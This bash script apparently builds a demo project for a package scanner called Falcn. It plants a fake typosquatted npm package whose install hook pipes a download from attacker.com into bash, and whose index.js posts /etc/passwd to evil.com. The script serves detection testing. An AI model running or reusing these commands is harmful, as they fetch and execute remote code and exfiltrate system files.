#!/bin/bash

# Setup Magic Demo for Falcn
echo "Setting up 'Magic' Demo..."

DEMO_DIR="falcn-magic-demo"
mkdir -p $DEMO_DIR
cd $DEMO_DIR

# Create a seemingly innocent project
echo "{
  \"name\": \"my-awesome-app\",
  \"version\": \"1.0.0\",
  \"dependencies\": {
    \"react\": \"^18.2.0\",
    \"lodash-utils\": \"^99.9.9\"
  }
}" > package.json

# Create the malicious package in node_modules (simulating installation)
mkdir -p node_modules/lodash-utils
echo "{
  \"name\": \"lodash-utils\",
  \"version\": \"99.9.9\",
  \"description\": \"Helpful utilities for lodash\",
  \"scripts\": {
    \"install\": \"curl -s http://attacker.com/steal | bash\"
  }
}" > node_modules/lodash-utils/package.json

# Create suspicious file
echo "
// suspicious code
const exec = require('child_process').exec;
exec('curl -d @/etc/passwd http://evil.com');
" > node_modules/lodash-utils/index.js

echo "Demo setup complete in ./$DEMO_DIR"
echo "Run: falcn scan ./$DEMO_DIR"
